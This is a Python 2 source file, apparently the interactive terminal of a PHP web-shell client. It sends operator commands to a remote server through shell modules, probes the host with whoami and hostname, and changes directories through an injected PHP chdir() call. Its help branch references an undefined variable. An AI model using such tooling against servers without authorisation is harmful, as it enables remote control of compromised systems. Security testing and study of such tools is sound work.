'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleexception import ModuleException
from core.configs import Configs, dirpath, rcfilepath
from core.vector import Vector
import os, re, shlex, readline, atexit

module_trigger = ':'
help_string = ':show'
set_string = ':set'
load_string = ':load'
gen_string = ':generator'


class Terminal:

    def __init__( self, modhandler, one_shot = False):

        self.modhandler = modhandler

        self.configs = Configs()
        self.__load_rcfile(dirpath + rcfilepath, default_rcfile=True)
        self.__init_completion()
        
        
        
    def loop(self):

        username, hostname = self.__env_init()
        self.__cwd_handler()
        
        while self.modhandler.interpreter:

            prompt = '{user}@{host}:{path} {prompt} '.format(
                                                             user=username, 
                                                             host=hostname, 
                                                             path=self.modhandler.load('shell.php').stored_args['path'], 
                                                             prompt = 'PHP>' if (self.modhandler.interpreter == 'shell.php') else '$' )

            cmd = shlex.split(raw_input( prompt ).strip())
            if not cmd:
                continue

            self.run_cmd_line(cmd)

    def run_cmd_line(self, command):

        output = ''
        
        try:
    
            ## Help call
            if command[0] == help_string:
                if len(command) == 2:
                    self.modhandler.load(modname).argparser.print_help()
                else:
                    pass
                    # PRINT SUMMARY
    
            ## Set call if ":set module" or ":set module param value"
            elif command[0] == set_string and len(command) > 1: 
                    self.modhandler.load(command[1]).save_args(command[2:])
                    self.modhandler.load(command[1]).print_saved_args()

            ## Load call
            elif command[0] == load_string and len(command) == 2:
                self.__load_rcfile(command[1])
    
            ## Module call
            elif command[0][0] == module_trigger:
                print self.modhandler.load(command[0][1:]).run(command[1:])
                
            elif command[0] == 'cd':
                self.__cwd_handler(command)
                
            ## Raw command call. Command is re-joined to be considered as single command
            else:
                output = self.modhandler.load(self.modhandler.interpreter).run([ ' '.join(command) ] ) 
                if output != None:
                    print output

        except KeyboardInterrupt:
            print '[!] Stopped execution' 
        except ModuleException, e:
            print '[!] [%s] Error: %s' % (e.module, e.error)
        

    def __load_rcfile(self, path, default_rcfile=False):

        path = os.path.expanduser(path)

        if default_rcfile:
            
            if not os.path.exists(path):

                try:
                    rcfile = open(path, 'w').close()
                except Exception, e:
                    print "[!] Error creating '%s' rc file." % path
                else:
                    return []

        for cmd in self.configs.read_rc(path):

            cmd       = cmd.strip()

            if cmd:
                print '[RC exec] %s' % (cmd)

                self.run_cmd_line(shlex.split(cmd))

    def __cwd_handler (self, cmd = None):

        if cmd == None:
            cwd_new = Vector('system.info', '', 'basedir').execute(self.modhandler)
        elif len(cmd) == 2:
            cwd_new = Vector('shell.php', '', 'chdir("$path") && print(getcwd());').execute(self.modhandler, { 'path' : cmd[1] })
            if not cwd_new:
                print "[!] Folder '%s' change failed, no such file or directory or permission denied" % cmd[1]
                return
        else:
            return
            
        self.modhandler.load('shell.php').stored_args['path'] = cwd_new
        

    def __env_init(self):
        
        print "[+] Starting terminal, shell probe may take a while"
        
        username =  Vector('system.info', "" , "whoami").execute(self.modhandler)
        hostname =  Vector('system.info', "" , "hostname").execute(self.modhandler)

        #self.modhandler.set_verbosity(1)
        Vector('shell.sh', "sh_env_init", "True").execute(self.modhandler)
        #self.modhandler.set_verbosity()
        
        if Vector('system.info', "" , "safe_mode").execute(self.modhandler) == '1':
            print '[!] PHP Safe mode enabled'
            
        
        return username, hostname


    def __init_completion(self):

            self.matching_words =  [':%s' % m for m in self.modhandler.modules_classes.keys()] + [help_string, load_string, set_string]
        
            try:
                readline.set_completer_delims(' \t\n;')
                readline.parse_and_bind( 'tab: complete' )
                readline.set_completer( self.__complete )
                readline.read_history_file( self.configs.historyfile )

            except IOError:
                pass
            atexit.register( readline.write_history_file, self.configs.historyfile )



    def __complete(self, text, state):
        """Generic readline completion entry point."""

        try:
            buffer = readline.get_line_buffer()
            line = readline.get_line_buffer().split()

            if ' ' in buffer:
                return []

            # show all commandspath
            if not line:
                all_cmnds = [c + ' ' for c in self.matching_words]
                if len(all_cmnds) > state:
                    return all_cmnds[state]
                else:
                    return []

            # account for last argument ending in a space
#            if respace.match(buffer):
#                line.append('')
            # resolve command to the implementation function

            cmd = line[0].strip()

            if cmd in self.matching_words:
                return [cmd + ' '][state]

            results = [c + ' ' for c in self.matching_words if c.startswith(cmd)] + [None]
            if len(results) == 2:
                if results[state]:
                    return results[state].split()[0] + ' '
                else:
                    return []
            return results[state]

        except Exception, e:
            print '[!] Completion error: %s' % e
